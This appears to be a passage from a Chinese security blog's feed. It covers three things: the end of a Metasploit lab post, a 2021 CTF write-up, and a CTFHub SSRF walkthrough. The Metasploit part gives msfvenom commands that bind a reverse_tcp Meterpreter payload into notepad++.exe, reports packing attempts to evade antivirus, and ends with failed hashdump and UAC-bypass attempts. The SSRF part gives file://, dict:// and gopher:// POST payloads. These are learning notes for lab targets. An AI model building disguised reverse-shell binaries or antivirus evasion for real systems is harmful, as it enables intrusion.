class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ip</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口</span><br><span class="line">msf6 exploit(multi/handler) &gt; run      //开始监听，等待...</span><br></pre></td></tr></table></figure><hr><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><h3 id="捆绑其它软件exe"><a href="#捆绑其它软件exe" class="headerlink" title="捆绑其它软件exe"></a>捆绑其它软件exe</h3><p>下载一个软件比如notepad++，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -x notepad++.exe -f exe -o demo01.exe</span><br></pre></td></tr></table></figure><p>主要是-x参数，这里把demo01.exe捆绑在notepad++.exe上了，然后保存在root目录下，名字为demo01.exe且看起来是notepad++的图标</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091556127.png" alt="image-20211209155657005"></p><p>然后一通设置之后…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options  //查看配置必选项</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ip</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口</span><br><span class="line">msf6 exploit(multi/handler) &gt; run      //开始监听，等待...</span><br></pre></td></tr></table></figure><p>然后打开了win10自带的病毒查杀，但是没有查到威胁…</p><p>然后运行了一遍，发现控制不了靶机…一度怀疑我的metasploit或者端口号出现了问题，但是换了个端口还是不行，然后我再用之前实验(demo.exe)控制发现可以…就免杀的exe控制不了，所以估计是这个免杀方法用不了，而且如果杀毒软件是火绒的话是会被杀掉的</p><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o demo01.exe</span><br><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options  //查看配置必选项</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.29.137   //设置kali主机的ip</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 10000            //设置监听端口</span><br><span class="line">msf6 exploit(multi/handler) &gt; run      //开始监听，等待...</span><br></pre></td></tr></table></figure><p>加壳有压缩壳和加密壳，加壳是为了不让软件被别人反编译然后抄袭。kali中有upx可以进行脱壳和加壳，然后我先用的kali中的upx工具来把demo01.exe加壳…但是我加壳之后还是被杀了…</p><p>之后下载了Themida(<a href="https://www.52pojie.cn/thread-1217750-1-1.html">Themida下载链接</a>)，把demo01.exe从kali拖出来，然后再拖进脱壳32位软件的Themida</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091941194.png" alt="image-20211209194101010"></p><p>然后会生成一个demo01_protected.exe的文件，这个就是加壳的demo01.exe。加密后重新打开win10自带的病毒防护，病毒查到了demo01.exe是木马，但是没有查到demo01_protected.exe，说明加壳确实是<strong>可以绕过病毒防护和某些杀毒软件</strong>的(即将打脸)</p><p>然后双击demo01_protected.exe</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092002752.png" alt="image-20211209200248681"></p><p>虽然连得上，但是当你输入命令的时候，win10的病毒防护还是会弹出病毒提示</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091955422.png" alt="image-20211209195513306"></p><p>目测是因为你输入的命令在win10后台运行的时候被检测到并且定位到可执行文件并隔离(删除)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092001827.png" alt="image-20211209200134764"></p><p>妈呀…真是打脸哈哈哈哈。但是好像这个方法确实可以过腾讯管家和火绒，但是过不了360和win10的病毒防护</p><h2 id="想要获取hash值"><a href="#想要获取hash值" class="headerlink" title="想要获取hash值"></a>想要获取hash值</h2><p>当我在meterpreter控制台中输入hashdump的时候，meterpreter提示我</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrectpriv_passwd_get_sam_hashes:操作失败：参数不正确</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092150708.png" alt="image-20211209215054601"></p><p>getsystem也提示我全身不足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid         //获取当前用户名称</span><br></pre></td></tr></table></figure><p>好像确实是普通用户诶…当我根据<a href="https://hackergu.com/metasploit-%E6%9D%83%E9%99%90%E4%B8%8Ehashdump%E4%B9%8B%E9%97%B4%E7%9A%84%E8%AE%A4%E8%AF%86/">这篇文章</a>尝试使用exp绕过win10的UAC之后，又提示我</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)SESSION 可能与此模块不兼容（缺少 Meterpreter 功能：stdapi_sys_process_set</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112092157089.png" alt="image-20211209215755958"></p><p>淦…已经晚上十点了…我还是回宿舍洗个澡有空再研究吧</p>]]></content>
    
    
    <summary type="html">Metasploit的简单使用</summary>
    
    
    
    <category term="Kali" scheme="https://jason177.com/categories/Kali/"/>
    
    
    <category term="Metasploit" scheme="https://jason177.com/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>2021年黑盾杯wp</title>
    <link href="https://jason177.com/2021/12/03/hdb2021/"/>
    <id>https://jason177.com/2021/12/03/hdb2021/</id>
    <published>2021-12-03T05:20:50.000Z</published>
    <updated>2021-12-03T08:17:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>二轮游了，拿了个优秀奖…不过第一次参加CTF省赛，也算是超过预期了吧，一开始是没想到能过初赛进入到复赛，和各高校的大佬比起来进决赛想必也是只有被吊打的份…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031352342.png" alt="image-20211203135249754"></p><p>希望以后还能有更多机会参加更多的比赛锻炼锻炼自己吧。写一下赛后wp记录一下吧</p><blockquote><p><strong>菜狗就做了DNS协议分析和日志分析这两题，其它都是队友做的，哭唧唧</strong></p></blockquote><hr><h1 id="DNS协议分析"><a href="#DNS协议分析" class="headerlink" title="DNS协议分析"></a>DNS协议分析</h1><p>解压DNS协议分析zip压缩包，得到一个pcapng后缀的文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031358371.png" alt="image-20211203135827300"></p><p>用wireshark打开，并且根据题意，过滤出dns协议的数据</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031359950.png" alt="image-20211203135912873"></p><p>可以看到在info字段，有疑似base64编码的痕迹</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031402444.png" alt="image-20211203140206375"></p><p>这时候先解码前四个字符，解出fla</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031402994.png" alt="image-20211203140242915"></p><p>大概率是flag被base64编码之后分解成很多段了</p><p>将所有疑似 base64 编码后的字符串找出</p><p><strong>ZmxhZ3tlNj</strong>.i6ov08.dnslog.cn</p><p><strong>YyYWMxNTRj</strong>.i6ov08.dnslog.cn</p><p><strong>YTM3NmUxYz</strong>.i6ov08.dnslog.cn</p><p><strong>AwMWVlOGJi</strong>.i6ov08.dnslog.cn</p><p><strong>ZTgxMzE4Yn0K</strong>.i6ov08.dnslog.cn</p><p>将其拼接在一起，得到<strong>ZmxhZ3tlNjYyYWMxNTRjYTM3NmUxYzAwMWVlOGJiZTgxMzE4Yn0K</strong></p><p>进行base64解码可得flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031405591.png" alt="image-20211203140513531"></p><hr><h1 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h1><p>解开压缩文件，得到名为 access.log 的日志文件，将其打开</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031406614.png" alt="image-20211203140605535"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031406879.png" alt="image-20211203140612821"></p><p>看到很多url编码，先用notepad++自带的MIME Tools中的url Decode解码来把整个文本解码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031406807.png" alt="image-20211203140637744"></p><p>根据题目描述，需要得到黑客拿到的管理员密码，所以直接ctrl+F查找password字段</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031406964.png" alt="image-20211203140652887"></p><p>可以看出来是盲注，通过比较password中每个字符的ascii码大小得到对应的字符，再根据后面返回的数据长度，长度678是判断错误，675是判断正确</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031407194.png" alt="image-20211203140708109"></p><p>将其中正确的数值根据ascii表转为字符，即为管理员密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112031407693.png" alt="image-20211203140742621"></p><p>Flag 即为 ngjfdsUbdK</p><hr><h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p>本来以为是一道简单的签到题。。。</p><p>看到只有0和1，能想到的其实有二进制、培根密码、摩根密码、二维码等…但是数量这么庞大，二维码的概率更大一点</p><p>25w个字符，刚好是500×500的图片，一个字符代表一个像素。用脚本来把0和1变成二维码图像，需要用到python的PIL库，这里附上大佬(<a href="http://xumijiezi.xyz/">大佬的博客</a>)的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./ddd.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.readline()               //获取行内容</span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;1&quot;</span>:               //如果为<span class="number">1</span>，把<span class="number">255</span>加入列表中</span><br><span class="line">            d.append(<span class="number">255</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            d.append(<span class="number">0</span>)            //如果为<span class="number">0</span>，把<span class="number">0</span>加入列表中</span><br><span class="line">    g = np.array(d).reshape(<span class="number">500</span>, <span class="number">500</span>)       //列表转换成数组，并且设置<span class="number">500</span>行，<span class="number">500</span>列的形状</span><br><span class="line">    Image.fromarray(g).convert(<span class="string">&#x27;L&#x27;</span>).save(<span class="string">&#x27;./signin.png&#x27;</span>)      //用<span class="string">&#x27;L&#x27;</span>模式，把数组转换成图片保存为signin.png</span><br></pre></td></tr></table></figure><blockquote><p>‘L’模式为灰度图像，每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。PIL中一共有九种模式</p></blockquote><p>得到缺少一个定位符的二维码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051506849.png" alt="image-20211205150604683"></p><p>放入QR Research即可得到二维码的内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051508241.png" alt="image-20211205150808125"></p><p>拿到flag</p><hr><h1 id="Modbus的秘密"><a href="#Modbus的秘密" class="headerlink" title="Modbus的秘密"></a>Modbus的秘密</h1><p>题目描述 flag在最长的modbus流里面，过滤一下modbus协议然后排序一下就可以在最长的数据流中看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051512546.png" alt="image-20211205151205479"></p><hr><h1 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h1><p>这题我还没看懂。。。看懂了再记录吧</p><h1 id="在线电力控制系统消息传送"><a href="#在线电力控制系统消息传送" class="headerlink" title="在线电力控制系统消息传送"></a>在线电力控制系统消息传送</h1><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051516925.png" alt="image-20211205151636819"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051517610.png" alt="image-20211205151726549"></p><p>随意输入网址，页面出现提示要求必须包含 dianli.com，而且通过burpsuite拦截包的话可以发现是post了一个url参数</p><p>根据题目提示，应该需要绕过 parse_url 函数，使用 // 可以实现绕过</p><p>当我尝试了伪协议file之后，或者输入路径var时，会提示”Hacker!!”，所以应该是把file伪协议和linux一些目录名给过滤掉了，那只能使用相对路径(目录穿越)，如果路径输入错误的话会提示”No such file or directory in …”，所以更加确定flag是藏在其它路径下</p><p>比赛的时候不敢用dirsearch去扫描web目录…所以这个只能盲猜路径和flag文件名…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051522130.png" alt="image-20211205152210060"></p><p>拿到flag</p><hr><h1 id="Master-Of-VM"><a href="#Master-Of-VM" class="headerlink" title="Master Of VM"></a>Master Of VM</h1><p>根据题目信息(给了ip、端口、账号和密码)，使用ssh连接靶机</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051525491.png" alt="image-20211205152535432"></p><p>使用 ls 命令查看当前目录内容，发现有 flag 文件。使用 cat 命令查看 flag 文件，发现没有权限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051525507.png" alt="image-20211205152550450"></p><p>继续浏览，在根目录发现 flag.txt 文件，使用 cat 命令查看</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112051526789.png" alt="image-20211205152615731"></p><p>得到 flag</p>]]></content>
    
    
    <summary type="html">2021年黑盾杯复赛一些题目的wp</summary>
    
    
    
    <category term="CTF比赛" scheme="https://jason177.com/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
    <category term="http" scheme="https://jason177.com/tags/http/"/>
    
    <category term="SSRF" scheme="https://jason177.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-SSRF</title>
    <link href="https://jason177.com/2021/11/17/ssrf/"/>
    <id>https://jason177.com/2021/11/17/ssrf/</id>
    <published>2021-11-17T11:08:04.000Z</published>
    <updated>2021-11-18T08:17:00.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-SSRF"><a href="#CTFHub-SSRF" class="headerlink" title="CTFHub-SSRF"></a>CTFHub-SSRF</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;SSRF</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p><a href="https://www.bilibili.com/read/cv12733096">相关链接</a></p><blockquote><p><strong>SSRF</strong>(Server-side Request Forge, 服务端请求伪造)：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务，类型可分为有回显和无回显两种。</p></blockquote><blockquote><p><strong>例子</strong>：攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。<strong>其实意思就是利用服务器A来对内部网络中的系统B发起请求。</strong><a href="https://www.freebuf.com/articles/web/258365.html">相关链接</a></p></blockquote><blockquote><p><strong>漏洞产生原因</strong>：服务端提供从其他服务器应用获取数据的功能，却没有对地址和协议做过滤，导致可利用此功能攻击服务端本机或所在内网。</p></blockquote><blockquote><p><strong>漏洞危害</strong>：探测内网信息、攻击内网应用</p></blockquote><blockquote><p><strong>常见场景</strong>：云服务商操作数据库、远程图片加载、网站采集抓取、头像、让你输入网址和ip的地方、webmail收发其他邮箱邮件、转码服务、在线翻译、收藏功能等。</p></blockquote><blockquote><p><strong>漏洞利用常用协议</strong>：file、http(s)、dict、gopher</p></blockquote><p>所以在做题目之前我们需要先<strong>简单了解</strong>在SSRF当中最常使用的四种URL伪协议，然后我们通过做题来理解怎么使用。</p><h2 id="四种URL伪协议"><a href="#四种URL伪协议" class="headerlink" title="四种URL伪协议"></a>四种URL伪协议</h2><p><a href="https://zhuanlan.zhihu.com/p/115222529">相关链接</a></p><h3 id="file"><a href="#file" class="headerlink" title="file:///"></a>file:///</h3><p>该伪协议可以从文件系统中获取文件，file协议的格式为：file:///文件路径</p><h3 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h3><p>词典网络协议。通过dict协议，可以探测端口的开放情况和指纹信息。dict协议的格式为：dict://ip地址:port端口</p><h3 id="http-s"><a href="#http-s" class="headerlink" title="http(s)://"></a>http(s)://</h3><p>这个协议其实非常常见，一般加在url前面的，向目标发送http请求。</p><div class="note green icon simple"><i class="note-icon fas fa-thumbs-up"></i><p><strong>file协议和http协议的区别：</strong></p><ul><li>file协议主要用于读取服务器本地文件，访问的是本地的静态资源</li><li>http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析</li><li>http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</li><li>file对应的类似http的协议是ftp协议（文件传输协议）</li><li>file不能跨域</li></ul></div><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引。需要发送多行数据时，就要用到gopher协议。gopher协议使用限制如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172051862.png" alt="image-20211117205137796"></p><p><strong>gopher协议支持发出GET、POST请求</strong>：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p><strong>Gopher协议格式：</strong></p><p>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</p><p><strong>gopher的默认端口是70如果发起post请求，回车换行需要使用%0d%0a</strong>，如果多个参数，参数之间的&amp;也需要进行URL编码</p><p><strong>所以总的来说，gopher可以构造很多种不同类型的请求</strong>，下面的题目会利用gopher构造post请求。</p><p>Gopher牛逼！！！</p><h2 id="CTFHub-SSRF系列wp"><a href="#CTFHub-SSRF系列wp" class="headerlink" title="CTFHub-SSRF系列wp"></a>CTFHub-SSRF系列wp</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>看到题目：内网访问。然后再看题目描述：尝试访问位于127.0.0.1的flag.php吧</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172006588.png" alt="image-20211117200640184"></p><p>然后我们开启题目，点击网址之后的url栏是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172008338.png" alt="image-20211117200853279"></p><p>这里有一个名为”url”的参数，既然题目说了127.0.0.1中有一个flag.php，那我们就把”url=”后面的”_”替换成”127.0.0.1/flag.php”,拿到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p>这题还蛮简单的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172010988.png" alt="image-20211117201040928"></p><p>如果想要更规范的表达，那就加个http</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181343298.png" alt="image-20211118134316693"></p><h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>题目：伪协议读取文件。题目描述：尝试去读取一下Web目录下的flag.php吧</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172018092.png" alt="image-20211117201855010"></p><p>由题可知，flag.php放在web的目录下，那默认apache的web目录路径为/var/www/html/</p><p>并且file伪协议可以从文件系统中获取文件，所以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172034893.png" alt="image-20211117203421808"></p><p>???</p><p>不慌，我们看一下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-2faad2126ffe77a6.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172034612.png" alt="image-20211117203414561"></p><p>拿到flag</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>查看题目：端口扫描。题目描述：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172036472.png" alt="image-20211117203617368"></p><p>如题可知，我们需要从端口8000~9000中间找到对的端口，拿到flag。</p><p>这里我们直接用burpsuite进行抓包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1:8000       //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172139888.png" alt="image-20211117213950803"></p><p>抓到包之后把数据包传到测试器Intruder</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172140501.png" alt="image-20211117214035422"></p><p>然后为127.0.0.1:8000中的8000添加成一个payload</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172142521.png" alt="image-20211117214254436"></p><p>然后设置载荷集，从8000开始，逐一递增至9000结束。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172144272.png" alt="image-20211117214429184"></p><p>然后得到一个返回包长度不一样的即为我们想要的端口号，里面存有flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172146999.png" alt="image-20211117214651915"></p><p>这里也可以用dict来探测端口的指纹信息，根据长度不同也可以判断出有flag(这里我重置了一下环境，所以扫到的flag的端口换了一下)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181351434.png" alt="image-20211118135135337"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181352534.png" alt="image-20211118135205424"></p><p>去google浏览器中文翻译一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181353105.png" alt="image-20211118135321027"></p><p>可以看到端口8526有开启apache的web服务，上面是指纹信息，不过这里看不到flag，要把”dict://“去掉或者换成”http://“来访问该端口，即可得到flag，dict只是用来探测端口的开放情况。</p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>题目：POST请求。题目描述：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181433028.png" alt="image-20211118143358925"></p><p>描述中说要发一个POST请求，而且又提到了curl。百度了一下，curl是支持gopher协议的，而且gopher可以发送POST请求，所以可能是利用gopher来解题。(这题网上说302.php被删掉了，而且后面扫描web目录的时候确实没发现302.php，所以就不管这个302.php了)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181441578.png" alt="image-20211118144142496"></p><p>进入题目之后，网页一片空白，源代码也没有什么东西。那首先我们先用”127.0.0.1”替换掉”_”，然后用dirsearch扫一下web目录</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181445026.png" alt="image-20211118144508939"></p><p>然后发现了两个东西：index.php和flag.php，而index.php是默认主页，被重定向到/?url=_，也就是我们一开始点进去的默认网页。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181448480.png" alt="image-20211118144858403"></p><p>那我们访问一下flag.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php//url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181450589.png" alt="image-20211118145000498"></p><p>发现有一个输入框，然后我们看到源码有个注释：”key=98e7725c8992ee446316ea02eff8ff0f”</p><p>大概可以想到，我们需要提交一个POST请求，带上”key=98e7725c8992ee446316ea02eff8ff0f”参数</p><p>所以现在我们要做的是：</p><ul><li><p>gopher协议格式：URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流(这个下划线”_“是因为gopher协议会吃掉第一个字符，所以要先放一个没有用的字符，什么字符都行)</p></li><li><p>构造标准的POST请求</p></li><li><p>对请求进行URL编码，并且回车换行需要把%0A改成%0D%0A(gopher协议格式)</p></li><li><p>然后对已经URL编码后的请求再进行一次URL编码(<strong>因为浏览器会做一次URL的解码，%20等字符已经被转码为空格，而发起gopher时需要用的是URL编码的值，也就是要以一次编码的形式传入函数里进行第二次请求，服务器又解码一次才变成我们正常所能理解的网页请求，但是现在已经被解码回原来的样子，原来有特殊字符的请求服务器是不认定的，所以这里我们进行两次URL编码的目的是，抵消掉浏览器的一次解码，这样后面的POST参数写进gopher协议的时候就会用到一次URL编码的值，刚好服务器又把协议里的编码值解码，就收到正常的网页请求</strong>。如果有两个”?”，说明会多一次跳转，有两个URL解码的过程，这时候就要进行三次URL编码了，<a href="https://blog.csdn.net/rfrder/article/details/108589988">相关链接</a>)</p></li><li><p>根据gopher协议格式，把编码后的请求内容粘贴到TCP数据流的位置中</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111182132080.png" alt="image-20211118213212969"></p><p>所以我们先构造一个标准的POST请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=98e7725c8992ee446316ea02eff8ff0f</span><br></pre></td></tr></table></figure><p>其中，上面的四个参数：POST、Host、Content-Type、Content-Length是POST请求必须的，如果少了会报错，但是GET请求就不需要这么多。而且Content-Length应为字符串“key=98e7725c8992ee446316ea02eff8ff0f”的长度</p><p>然后在HackBar中对上述构造的POST请求进行URL编码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181457623.png" alt="image-20211118145716511"></p><p>注意编码后要在每个%0A前面添加%0D</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181539451.png" alt="image-20211118153954391"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">POST%</span><span class="bash">20%2fflag.php%20HTTP%2f1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Type:%20application%2fx-www-form-urlencoded%0D%0AContent-Length:%2036%0D%0A%0D%0Akey=98e7725c8992ee446316ea02eff8ff0f</span></span><br></pre></td></tr></table></figure><p>然后再把上述编码后的POST请求再进行一次URL编码，得到如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">POST%</span><span class="bash">2520%252fflag.php%2520HTTP%252f1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Type:%2520application%252fx-www-form-urlencoded%250D%250AContent-Length:%252036%250D%250A%250D%250Akey=98e7725c8992ee446316ea02eff8ff0f</span></span><br></pre></td></tr></table></figure><p>然后就可以通过gopher协议的格式，在url栏提交POST请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-5eeccc951ae08152.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520%252fflag.php%2520HTTP%252f1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Type:%2520application%252fx-www-form-urlencoded%250D%250AContent-Length:%252036%250D%250A%250D%250Akey=98e7725c8992ee446316ea02eff8ff0f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181513272.png" 